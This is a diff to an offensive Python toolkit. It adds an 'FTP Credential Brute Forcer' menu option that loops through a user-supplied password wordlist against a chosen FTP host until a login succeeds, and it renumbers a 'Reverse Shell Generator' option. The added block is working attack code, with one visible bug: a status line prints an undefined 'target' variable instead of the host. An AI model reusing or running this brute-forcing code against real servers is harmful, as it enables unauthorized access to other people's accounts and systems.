@@ -381,7 +381,8 @@ try:
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m02\u001b[0m] Shodan Lookup
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m03\u001b[0m] Site Directory Brute Forcer
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m04\u001b[0m] SSH Credential Brute Forcer
-\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m05\u001b[0m] Reverse Shell Generator
+\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m05\u001b[0m] FTP Credential Brute Forcer
+\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m06\u001b[0m] Reverse Shell Generator
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m99\u001b[0m] Back
 \u001b[38;5;50m|\u001b[0m[ \u001b[38;5;226mCNTRL + C TO EXIT\u001b[0m ]\u001b[38;5;50m
 |
@@ -460,8 +461,33 @@ try:
                             flushletters("Version 3.0.0")
                             print("\u001b[0m")
 
-
+                        
                         if weaponlabchoice == "5":
+                            host = str(input("\n\u001b[38;5;50mFTP CREDENTIAL BRUTE FORCER\u001b[0m\n\nWhat FTP Host would you like to brute force the credentials to? : "))
+                            username = input("What username would you like to use? : ")
+                            wordlist = input("What is the file path of the wordlist you would like to use? : ")
+                            print("Brute Forcing the FTP credentials for " + str(username) + "@" + str(target) + "...")
+                            with open(str(wordlist), 'r') as list:
+                                for line in list:
+                                    try:
+                                        password = line.strip()
+                                        ftp = ftplib.FTP(host)
+                                        ftp.login(str(username), str(password))
+                                        ftp.quit()
+                                    except:
+                                        print("[\u001b[31m-\u001b[0m] " + str(username) + '@' + str(host) + ':' + str(password))
+                                    else:
+                                        print("\n\nLogin Found!\n[\u001b[32m+\u001b[0m] " + str(username) + '@' + str(host) + ':' + str(password) + '\n')
+                                        break
+                            input("Press ENTER To Go Back.")
+                            clear()
+                            print(banner, end="", flush=True)
+                            time.sleep(3)
+                            flushletters("Version 3.0.0")
+                            print("\u001b[0m")
+
+
+                        if weaponlabchoice == "6":
                             shellchoice = str(input("\n\u001b[38;5;50mREVERSE SHELL GENERATOR\u001b[0m\n\nWhat kind of reverse shell would you like to generate?\n\n[1] PHP\n[2] Perl\n\n : "))
 
                             if shellchoice == "1":
